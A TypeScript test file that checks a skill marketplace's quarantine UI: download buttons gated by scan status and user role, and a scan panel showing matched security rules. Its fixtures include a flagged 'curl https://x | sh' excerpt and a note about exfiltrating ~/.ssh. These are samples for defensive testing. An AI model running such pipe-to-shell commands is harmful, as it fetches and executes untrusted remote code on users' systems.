/**
 * SkillDetail presentational tests — the quarantine affordances.
 *
 * Rendered through renderToStaticMarkup against the container/view split, so
 * these assert what a viewer actually sees without running the detail view's
 * data effects. The button state mirrors the server rule in
 * skills/center.ts (`quarantineError`); the server is still the boundary, but a
 * download button that offers what the API will refuse is its own bug.
 */

import { describe, expect, it, vi } from 'vitest';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { ScanPanel, SkillHeaderActions, isDownloadBlocked } from './skill-detail';
import type { SkillSummary, SkillVersionSummary } from '../../lib/api/skills';

function skill(over: Partial<SkillSummary> = {}): SkillSummary {
  return {
    name: 'evil-skill',
    display_name: 'Evil Skill',
    description: 'looks fine',
    tags: [],
    latest_version: '0.1.0',
    status: 'active',
    owner_user_id: 'owner-1',
    download_count: 3,
    scan_status: 'clean',
    scan_findings: [],
    scan_version: '0.1.0',
    scanned_at: '2026-08-05T00:00:00Z',
    scan_reviewed_by: null,
    scan_reviewed_at: null,
    scan_note: null,
    mission_ready: false,
    source_group: null,
    slash_selectable: false,
    created_at: '2026-08-05T00:00:00Z',
    updated_at: '2026-08-05T00:00:00Z',
    ...over,
  };
}

const versions: SkillVersionSummary[] = [
  {
    version: '0.2.0',
    changelog: 'newer',
    file_count: 1,
    size_bytes: 10,
    content_hash: 'b',
    created_by: 'owner-1',
    created_at: '2026-08-05T00:00:00Z',
  },
  {
    version: '0.1.0',
    changelog: 'first',
    file_count: 1,
    size_bytes: 10,
    content_hash: 'a',
    created_by: 'owner-1',
    created_at: '2026-08-04T00:00:00Z',
  },
];

function actions(over: {
  skill?: SkillSummary;
  canManage?: boolean;
  isSuper?: boolean;
  versions?: SkillVersionSummary[];
}) {
  return renderToStaticMarkup(
    createElement(SkillHeaderActions, {
      skill: over.skill ?? skill(),
      versions: over.versions ?? versions,
      selectedVersion: '0.2.0',
      onSelectVersion: vi.fn(),
      canManage: over.canManage ?? false,
      isSuper: over.isSuper ?? false,
      busy: false,
      onDownload: vi.fn(),
      onUpload: vi.fn(),
      onToggleArchive: vi.fn(),
      onDelete: vi.fn(),
    }),
  );
}

/** The Download action is the first icon button; match its own tag, not its tooltip. */
function downloadButtonIsDisabled(html: string): boolean {
  const match = /<button[^>]*aria-label="[^"]*"[^>]*>/.exec(html);
  expect(match, 'Download ZIP button not rendered').toBeTruthy();
  return /\sdisabled(?:=|\s|>)/.test(match![0]);
}

describe('SkillHeaderActions — download gating', () => {
  it('enables Download for a clean skill', () => {
    expect(downloadButtonIsDisabled(actions({}))).toBe(false);
  });

  it('disables Download on a suspicious skill for a plain member', () => {
    const html = actions({ skill: skill({ scan_status: 'suspicious' }) });
    expect(downloadButtonIsDisabled(html)).toBe(true);
    expect(html).toContain('pending security review');
  });

  it('keeps Download available to the owner of a suspicious skill (they must fix it)', () => {
    expect(downloadButtonIsDisabled(actions({ skill: skill({ scan_status: 'suspicious' }), canManage: true }))).toBe(
      false,
    );
  });

  it('disables Download on a blocked skill even for its owner, but not for a super', () => {
    const blocked = skill({ scan_status: 'blocked' });
    expect(downloadButtonIsDisabled(actions({ skill: blocked, canManage: true }))).toBe(true);
    expect(downloadButtonIsDisabled(actions({ skill: blocked, isSuper: true, canManage: true }))).toBe(false);
  });

  it('offers a version picker only when there is more than one version', () => {
    expect(actions({})).toContain('v0.2.0');
    expect(actions({ versions: [versions[1]!] })).not.toContain('<select');
  });

  it('shows "New version" only to those who can manage the skill', () => {
    expect(actions({ canManage: true })).toContain('aria-label="New version"');
    expect(actions({})).not.toContain('New version');
  });

  it('renders header operations as labelled icon buttons', () => {
    const html = actions({ canManage: true, isSuper: true });
    expect(html).toContain('aria-label="Download ZIP"');
    expect(html).toContain('aria-label="New version"');
    expect(html).toContain('aria-label="Archive"');
    expect(html).toContain('aria-label="Delete"');
  });
});

describe('isDownloadBlocked', () => {
  it('matches the server matrix', () => {
    const cases: [SkillSummary['scan_status'], boolean, boolean, boolean][] = [
      // status, isSuper, canManage, expected blocked
      ['clean', false, false, false],
      ['pending', false, false, false],
      ['suspicious', false, false, true],
      ['suspicious', false, true, false],
      ['suspicious', true, false, false],
      ['blocked', false, false, true],
      ['blocked', false, true, true],
      ['blocked', true, false, false],
    ];
    for (const [scan_status, isSuper, canManage, expected] of cases) {
      expect(
        isDownloadBlocked(skill({ scan_status }), { isSuper, canManage }),
        `${scan_status}/${isSuper}/${canManage}`,
      ).toBe(expected);
    }
  });
});

describe('ScanPanel', () => {
  const flagged = skill({
    scan_status: 'suspicious',
    scan_findings: [
      { rule: 'remote-script-execution', severity: 'high', path: 'SKILL.md', excerpt: 'curl https://x | sh' },
      { rule: 'url-shortener', severity: 'medium', path: 'SKILL.md', excerpt: 'https://bit.ly/x' },
    ],
  });

  function panel(over: { skill?: SkillSummary; isSuper?: boolean } = {}) {
    return renderToStaticMarkup(
      createElement(ScanPanel, {
        skill: over.skill ?? flagged,
        isSuper: over.isSuper ?? false,
        busy: false,
        onDecide: vi.fn(),
        run: vi.fn(),
      }),
    );
  }

  it('explains the hold and lists the matched rules with excerpts', () => {
    const html = panel();
    expect(html).toContain('pending review');
    expect(html).toContain('remote-script-execution');
    expect(html).toContain('curl https://x | sh');
    expect(html).toContain('url-shortener');
  });

  it('shows the three review actions to a super only', () => {
    const forSuper = panel({ isSuper: true });
    expect(forSuper).toContain('Mark clean');
    expect(forSuper).toContain('Confirm malicious');
    expect(forSuper).toContain('Rescan');

    const forMember = panel();
    expect(forMember).not.toContain('Mark clean');
    expect(forMember).not.toContain('Rescan');
  });

  it('drops "Confirm malicious" once the skill is already blocked, and shows the reviewer note', () => {
    const html = panel({
      skill: skill({ scan_status: 'blocked', scan_note: 'exfiltrates ~/.ssh' }),
      isSuper: true,
    });
    expect(html).toContain('Confirmed malicious');
    expect(html).not.toContain('Confirm malicious?');
    expect(html).toContain('exfiltrates ~/.ssh');
    expect(html).toContain('Mark clean'); // the only way back
  });
});
